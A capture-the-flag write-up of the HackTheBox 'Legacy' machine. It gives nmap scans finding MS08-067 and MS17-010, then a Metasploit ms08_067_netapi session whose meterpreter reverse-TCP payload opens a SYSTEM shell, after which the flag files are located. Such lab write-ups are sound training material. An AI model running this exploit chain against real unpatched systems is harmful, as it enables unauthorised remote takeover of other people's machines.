# Legacy Walkthrough

![legacy](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Legacy/legacy.png)

## let's first fast scan out machine with nmap

```console
$ sudo nmap -F -sV 10.10.10.4   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 18:10 IST 
Nmap scan report for 10.10.10.4 
Host is up (0.27s latency). 
Not shown: 97 filtered tcp ports (no-response) 
PORT     STATE  SERVICE       VERSION 
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn 
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds 
3389/tcp closed ms-wbt-server 
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

```

## let's also do a berif scan using nmap.

```console
$ sudo nmap -A -O -v --script vuln 10.10.10.4
PORT     STATE  SERVICE       VERSION 
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn 
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds 
3389/tcp closed ms-wbt-server 
Device type: general purpose|specialized 
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (88%) 
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::
sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2 
Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows 
XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Mi
crosoft Windows XP SP2 or Windows Server 2003 (91%), Microsoft Windows XP SP2 or SP3 (91%), Microsoft Windows Server 2003
 (90%), Microsoft Windows XP Professional SP3 (90%) 
No exact OS matches for host (test conditions non-ideal). 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=259 (Good luck!) 
IP ID Sequence Generation: Incremental 
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp 
 
Host script results: 
|_smb-vuln-ms10-054: false 
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED 
| smb-vuln-ms17-010:  
|   VULNERABLE: 
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) 
|     State: VULNERABLE 
|     IDs:  CVE:CVE-2017-0143 
|     Risk factor: HIGH 
|       A critical remote code execution vulnerability exists in Microsoft SMBv1 
|        servers (ms17-010). 
|            
|     Disclosure date: 2017-03-14 
|     References: 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ 
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx 
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) 
| smb-vuln-ms08-067:  
|   VULNERABLE: 
|   Microsoft Windows system vulnerable to remote code execution (MS08-067) 
|     State: VULNERABLE 
|     IDs:  CVE:CVE-2008-4250 
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
|           code via a crafted RPC request that triggers the overflow during path canonicalization. 
|            
|     Disclosure date: 2008-10-23 
|     References: 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx 
 
TRACEROUTE (using port 3389/tcp) 
HOP RTT       ADDRESS 
1   300.58 ms 10.10.14.1 
2   296.17 ms 10.10.10.4
```

## we got 2 port open those are smb ports , let's try to enumerate these port using nmap smb script.

```console
$sudo nmap --script smb-vuln* -p 137,139,445 10.10.10.4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 18:25 IST 
Nmap scan report for 10.10.10.4 
Host is up (0.26s latency). 
 
PORT    STATE    SERVICE 
137/tcp filtered netbios-ns 
139/tcp open     netbios-ssn 
445/tcp open     microsoft-ds 
 
Host script results: 
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) 
|_smb-vuln-ms10-054: false 
| smb-vuln-ms17-010:  
|   VULNERABLE: 
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) 
|     State: VULNERABLE 
|     IDs:  CVE:CVE-2017-0143 
|     Risk factor: HIGH 
|       A critical remote code execution vulnerability exists in Microsoft SMBv1 
|        servers (ms17-010). 
|            
|     Disclosure date: 2017-03-14 
|     References: 
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ 
| smb-vuln-ms08-067:  
|   VULNERABLE: 
|   Microsoft Windows system vulnerable to remote code execution (MS08-067) 
|     State: VULNERABLE 
|     IDs:  CVE:CVE-2008-4250 
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
|           code via a crafted RPC request that triggers the overflow during path canonicalization. 
|            
|     Disclosure date: 2008-10-23 
|     References: 
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 
 
Nmap done: 1 IP address (1 host up) scanned in 18.79 seconds
 ```
 
 ## i am going to use MS08-067 in metasploit
 
 ```console
 $msfconsole 
                                                   
# cowsay++ 
 ____________ 
< metasploit > 
 ------------ 
       \   ,__, 
        \  (oo)____ 
           (__)    )\ 
              ||--|| * 
 
 
       =[ metasploit v6.1.34-dev                          ] 
+ -- --=[ 2209 exploits - 1171 auxiliary - 395 post       ] 
+ -- --=[ 615 payloads - 45 encoders - 11 nops            ] 
+ -- --=[ 9 evasion                                       ] 
 
Metasploit tip: Metasploit can be configured at startup, see  
msfconsole --help to learn more
 
msf6 > use exploit/windows/smb/ms08_067_netapi  
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp 
msf6 exploit(windows/smb/ms08_067_netapi) > show options 
 
Module options (exploit/windows/smb/ms08_067_netapi): 
 
   Name     Current Setting  Required  Description 
   ----     ---------------  --------  ----------- 
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Usin 
                                       g-Metasploit 
   RPORT    445              yes       The SMB service port (TCP) 
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC) 
 
 
Payload options (windows/meterpreter/reverse_tcp): 
 
   Name      Current Setting  Required  Description 
   ----      ---------------  --------  ----------- 
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none) 
   LHOST     192.168.101.14   yes       The listen address (an interface may be specified) 
   LPORT     4444             yes       The listen port 
 
 
Exploit target: 
 
   Id  Name 
   --  ---- 
   0   Automatic Targeting 
 
 
msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4 
rhosts => 10.10.10.4 
msf6 exploit(windows/smb/ms08_067_netapi) > set lhost 10.10.14.10 
lhost => 10.10.14.10 
msf6 exploit(windows/smb/ms08_067_netapi) > exploit 
 
[*] Started reverse TCP handler on 10.10.14.10:4444  
[*] 10.10.10.4:445 - Automatically detecting the target... 
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English 
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX) 
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability... 
[*] Sending stage (175174 bytes) to 10.10.10.4 
[*] Meterpreter session 1 opened (10.10.14.10:4444 -> 10.10.10.4:1031 ) at 2022-04-13 18:30:57 +0530 
 
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM 
meterpreter > shell 
Process 272 created. 
Channel 1 created. 
Microsoft Windows XP [Version 5.1.2600] 
(C) Copyright 1985-2001 Microsoft Corp. 
 
C:\WINDOWS\system32>
 
 ```
 
 ## we got shell now it's time for searching flag i go to C:\Documents and Settings\john\Desktop and found user.txt
 
 ```console
 C:\Documents and Settings\john\Desktop>dir 
dir 
 Volume in drive C has no label. 
 Volume Serial Number is 54BF-723B 
 
 Directory of C:\Documents and Settings\john\Desktop 
 
16/03/2017  09:19 ��    <DIR>          . 
16/03/2017  09:19 ��    <DIR>          .. 
16/03/2017  09:19 ��                32 user.txt 
               1 File(s)             32 bytes 
               2 Dir(s)   6.297.690.112 bytes free 

```

## you can use type for viewing file content, i got root flag in C:\Documents and Settings\Administrator\Desktop this location.

```console
C:\Documents and Settings\Administrator\Desktop>dir 
dir 
 Volume in drive C has no label. 
 Volume Serial Number is 54BF-723B 
 
 Directory of C:\Documents and Settings\Administrator\Desktop 
 
16/03/2017  09:18 ��    <DIR>          . 
16/03/2017  09:18 ��    <DIR>          .. 
16/03/2017  09:18 ��                32 root.txt 
               1 File(s)             32 bytes 
               2 Dir(s)   6.297.681.920 bytes free
 
```

# Booommm!!! Machine Solved Successfully

![funny](https://c.tenor.com/ApogGMVjeeAAAAAC/dancing-dance.gif)
